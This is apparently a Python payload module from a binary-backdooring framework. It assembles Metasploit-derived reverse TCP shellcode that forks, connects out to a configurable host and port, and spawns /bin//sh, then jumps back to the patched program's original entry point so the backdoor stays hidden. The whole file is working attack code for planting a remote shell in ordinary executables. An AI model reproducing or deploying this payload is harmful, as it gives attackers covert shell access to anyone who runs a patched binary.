import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class reverse_shell_tcp():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "reverse_shell_tcp"
        self.description = """Basic reverse_shell_tcp (non-stager) from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['remove_signature']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        logger.debug(dir(self.PM))
        if support.support(self).check_reqs() is False:
            return False
        
        return self.run()

    def run(self):

        #From metasploit LHOST=127.0.0.1 LPORT=8080 Reverse Tcp
        
        self.shellcode2 = b"\x68"
        self.shellcode2 += common.pack_ip_addresses(self.HOST)
        self.shellcode2 += b"\x68\xff\x02"
        self.shellcode2 += struct.pack(">H", int(self.PORT))
        self.shellcode2 += bytes("\x89\xe7\x31\xc0\x50"
                            "\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x62"
                            "\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff\x4f\xe8\x79\xf6\x68"
                            "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x54\x53"
                            "\x50\xb0\x3b\xcd\x80", 'iso-8859-1'
                            )

        self.shellcode1 = b"\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"
        self.shellcode1 += b"\x0f\x84"
        
        if self.BDF.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.BDF.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.BDF.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        
        return self.shellcode
